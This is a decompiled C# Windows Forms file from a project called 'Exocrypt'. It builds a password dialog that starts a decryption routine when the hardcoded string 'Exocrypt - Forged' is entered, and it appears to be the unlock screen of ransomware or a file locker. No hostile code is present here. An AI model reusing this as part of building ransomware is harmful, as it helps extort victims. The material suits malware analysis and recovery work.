using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace Exocrypt;

public class DecryptPass : Form
{
	private IContainer components = null;

	private Label label1;

	private TextBox textBox1;

	private Button button1;

	public DecryptPass()
	{
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (((Control)textBox1).get_Text() == "Exocrypt - Forged")
		{
			Exocrypt0r exocrypt0r = new Exocrypt0r();
			exocrypt0r.StartDecryptionALG();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		label1 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Consolas", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(12, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(63, 14));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Password");
		((Control)textBox1).set_BackColor(Color.Black);
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)1);
		((Control)textBox1).set_Location(new Point(15, 26));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(201, 20));
		((Control)textBox1).set_TabIndex(1);
		textBox1.set_UseSystemPasswordChar(true);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_ForeColor(Color.FromArgb(100, 100, 100));
		((Control)button1).set_Location(new Point(222, 24));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(67, 23));
		((Control)button1).set_TabIndex(2);
		((Control)button1).set_Text("OK");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(301, 56));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("DecryptPass");
		((Control)this).set_Text("DecryptPass");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
